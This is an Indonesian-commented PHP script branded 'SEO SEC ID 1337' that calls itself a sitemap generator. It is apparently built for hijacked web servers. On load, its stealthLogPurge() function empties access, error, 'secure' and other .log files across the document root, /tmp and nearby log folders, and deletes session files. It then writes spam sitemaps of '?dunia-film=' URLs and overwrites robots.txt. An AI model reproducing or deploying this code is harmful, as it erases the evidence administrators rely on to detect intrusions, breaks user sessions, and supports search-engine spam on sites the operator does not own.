<?php
/**
 * Smart Sitemap Generator Pro + Stealth Log Purge
 * Author: SEO SEC ID
 */

// --- POLYFILL UNTUK PHP VERSI LAMA (< 8.0) ---
if (!function_exists('str_starts_with')) {
    function str_starts_with($haystack, $needle) {
        return (string)$needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;
    }
}
if (!function_exists('str_ends_with')) {
    function str_ends_with($haystack, $needle) {
        return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;
    }
}
if (!function_exists('str_contains')) {
    function str_contains($haystack, $needle) {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}

// --- FITUR: AUTO PURGE & DELETE LOGS ---
function stealthLogPurge() {
    $logNames = [
        'access_log', 'access.log', 'error_log', 'error.log', 
        'php_errors.log', 'available_logs', 'xferlog', 'secure'
    ];
    
    $paths = [
        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . '/../logs/' : null,
        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . '/tmp/' : null,
        '/tmp/',
        dirname(__FILE__) . '/',
        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . '/' : null
    ];

    $count = 0;
    foreach ($paths as $path) {
        if ($path && @is_dir($path)) {
            $files = @scandir($path);
            if ($files) {
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;

                    // Perbaikan: Cek akhiran .log
                    if (in_array($file, $logNames) || str_ends_with(strtolower($file), '.log')) {
                        $fullPath = rtrim($path, '/') . '/' . $file;
                        if (@is_writable($fullPath)) {
                            @file_put_contents($fullPath, ""); 
                            $count++;
                        }
                    }

                    // Hapus file sampah tmp
                    if (str_contains($path, 'tmp') && (str_starts_with($file, 'sess_') || str_starts_with($file, 'tmp_'))) {
                        @unlink(rtrim($path, '/') . '/' . $file);
                    }
                }
            }
        }
    }
    return $count;
}

// Jalankan pembersihan
$logsCleaned = stealthLogPurge();
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sitemap Generator Pro + Multi-Engine Index</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-6">

<div class="max-w-2xl w-full bg-gray-800 rounded-2xl shadow-2xl overflow-hidden border border-gray-700">
    <div class="bg-gradient-to-r from-indigo-600 to-purple-600 p-6 text-white text-center">
        <h1 class="text-2xl font-bold flex items-center justify-center gap-3">
            <i class="fas fa-user-secret"></i> SEO SEC ID 1337 Sitemap Pro
        </h1>
        <p class="text-indigo-100 text-sm opacity-80 mt-1">Sitemap Automation & Stealth Log Purge</p>
    </div>

    <div class="p-8">
        <?php
        $judulFile = "result.txt";

        if (file_exists($judulFile)) {
            $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
            $urlAsli = $protocol . "://" . $_SERVER['HTTP_HOST'] . str_replace(basename($_SERVER['PHP_SELF']), "", $_SERVER['REQUEST_URI']);
            
            $maxUrlsPerSitemap = 50000;
            $outputDirectory = "submit/";

            if (!is_dir($outputDirectory)) {
                @mkdir($outputDirectory, 0777, true);
            }

            $fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $totalUrls = count($fileLines);
            $numSitemaps = ceil($totalUrls / $maxUrlsPerSitemap);

            // 1. Buat Sitemap Index
            $sitemapIndexFile = fopen($outputDirectory . "query.xml", "w");
            fwrite($sitemapIndexFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
            fwrite($sitemapIndexFile, '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);

            for ($i = 0; $i < $numSitemaps; $i++) {
                $sitemapFileName = "sitemap-" . str_pad(($i + 1), 3, "0", STR_PAD_LEFT) . ".xml";
                $sitemapFilePath = $outputDirectory . $sitemapFileName;

                $sitemapFile = fopen($sitemapFilePath, "w");
                fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
                fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);

                $start = $i * $maxUrlsPerSitemap;
                $urlsChunk = array_slice($fileLines, $start, $maxUrlsPerSitemap);

                foreach ($urlsChunk as $judul) {
                    $judulClean = str_replace(' ', '-', trim($judul));
                    $sitemapLink = $urlAsli . '?dunia-film=' . urlencode($judulClean);
                    fwrite($sitemapFile, "  <url><loc>{$sitemapLink}</loc><changefreq>daily</changefreq><priority>0.8</priority></url>" . PHP_EOL);
                }
                fwrite($sitemapFile, '</urlset>' . PHP_EOL);
                fclose($sitemapFile);

                fwrite($sitemapIndexFile, "  <sitemap><loc>{$urlAsli}submit/{$sitemapFileName}</loc></sitemap>" . PHP_EOL);
            }
            fwrite($sitemapIndexFile, '</sitemapindex>' . PHP_EOL);
            fclose($sitemapIndexFile);

            // 2. Robots.txt
            $engines = ["Googlebot", "bingbot", "Baiduspider", "YandexBot", "Sogou web spider", "360Spider", "DuckDuckBot"];
            $robotsContent = "User-agent: *\nAllow: /\nDisallow: /cgi-bin/\nSitemap: {$urlAsli}submit/query.xml\n\n";
            foreach ($engines as $bot) { $robotsContent .= "User-agent: $bot\nDisallow:\n"; }
            @file_put_contents("robots.txt", $robotsContent);

            echo '
            <div class="space-y-6">
                <div class="grid grid-cols-3 gap-4 text-center">
                    <div class="bg-gray-700/50 p-4 rounded-xl border border-gray-600">
                        <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">URL</p>
                        <p class="text-xl font-mono text-blue-400 mt-1">' . number_format($totalUrls, 0, ',', '.') . '</p>
                    </div>
                    <div class="bg-gray-700/50 p-4 rounded-xl border border-gray-600">
                        <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">Logs Purge</p>
                        <p class="text-xl font-mono text-green-400 mt-1">' . $logsCleaned . '</p>
                    </div>
                    <div class="bg-gray-700/50 p-4 rounded-xl border border-gray-600">
                        <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">SEO Engine</p>
                        <p class="text-xl font-mono text-yellow-400 mt-1">7 Active</p>
                    </div>
                </div>

                <div class="bg-indigo-500/10 border border-indigo-500/50 p-4 rounded-xl flex items-center gap-4">
                    <div class="bg-indigo-500 rounded-full p-2">
                        <i class="fas fa-user-shield text-white text-xs"></i>
                    </div>
                    <p class="text-xs text-gray-400">
                        Sistem telah membersihkan <b>' . $logsCleaned . '</b> jejak log dan mengoptimasi <b>robots.txt</b> untuk indexing global.
                    </p>
                </div>

                <div class="flex flex-col gap-3">
                    <a href="submit/query.xml" target="_blank" class="flex items-center justify-between bg-indigo-600 hover:bg-indigo-500 p-4 rounded-xl transition font-bold group">
                        <span><i class="fas fa-link mr-2"></i> Sitemap Index</span>
                        <span class="text-xs opacity-50">query.xml</span>
                    </a>
                </div>
            </div>';

        } else {
            echo '<div class="text-center text-red-500 font-bold">result.txt Not Found!</div>';
        }
        ?>
    </div>
    
    <div class="bg-gray-900/50 p-4 text-center border-t border-gray-700">
        <p class="text-[10px] text-gray-500 uppercase tracking-tighter">SEO SEC ID 1337 | Stealth & Fast Indexing</p>
    </div>
</div>

</body>
</html>